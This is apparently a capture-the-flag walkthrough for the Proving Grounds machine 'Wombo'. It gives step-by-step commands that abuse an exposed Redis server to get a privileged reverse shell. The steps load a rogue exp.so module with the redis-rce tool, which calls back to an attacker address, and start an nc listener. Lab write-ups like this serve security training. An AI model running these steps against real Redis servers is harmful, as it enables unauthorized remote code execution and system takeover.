
# Wombo - Proving Grounds Walkthrough

## Initial Foothold & Privilege Escalation

The exploitation for Wombo is done entirely using Redis.

### Redis Exploit (Initial Foothold + PE)

We leverage the `redis-rce` tool and a malicious `.so` module.

#### Steps:

1. Download the rogue Redis module:
    - [exp.so file](https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so)

2. Clone the redis-rce repository (ignore the extra URL parameters):
    ```bash
    git clone https://github.com/Ridter/redis-rce
    cd redis-rce
    ```

3. Run the exploit using:
    ```bash
    python redis-rce.py -r 192.168.110.69 -p 6379 -L 192.168.45.166 -P 8080 -f exp.so
    ```

4. Make sure you start a listener:
    ```bash
    sudo nc -nlvp 8080
    ```

After successful exploitation, you will get a reverse shell with elevated privileges.
